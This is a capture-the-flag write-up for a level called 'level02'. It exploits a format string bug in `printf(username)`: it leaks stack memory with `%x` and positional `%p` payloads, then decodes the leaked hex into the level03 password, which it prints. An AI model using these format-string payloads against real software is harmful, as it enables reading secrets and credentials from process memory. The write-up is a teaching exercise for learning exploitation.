## Level02

First, I disassembled the executable and converted it into easy-to-understand C code (see `source.c`).
</br>
From there, it's much easier to see what vulnerabilities can be exploited; one might be tempted to use `system("/bin/sh")`.
</br>
However, the vulnerability lies in the `printf(username)` statement.

```bash
$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
--[ Password: s
*****************************************
ffffe4f0.0.73.2a2a2a2a.2a2a2a2a.ffffe6e8.f7ff9a08.73.0.0.0.0.0.0.0.0.0.0.0.0.0.34376848.61733951. does not have access!
```

You can see some interesting things starting with the 22nd element on the stack.
</br>
Actually, it's not really the 22nd element on the stack, rather the 22nd of printf.
</br>
In x86-64, the first 6 arguments of `printf` are passed via registers (rdi, rsi, rdx, rcx, r8, r9), and only starting with the 7th argument does it begin reading from the stack.

```bash
$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p%23$p%24$p%25$p%26$p%27$p
--[ Password: s
*****************************************
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil) does not have access!
```

We now have the contents of a string, which is actually the contents of the file `/home/users/level03/.pass`.
</br>
Now we'll have to convert it to ASCII and little-endian format

```python
$ python -c '
> raw = "0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d"
> blocks = raw.split("0x")[1:]
> print("".join(b.decode("hex")[::-1] for b in blocks))
> '
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
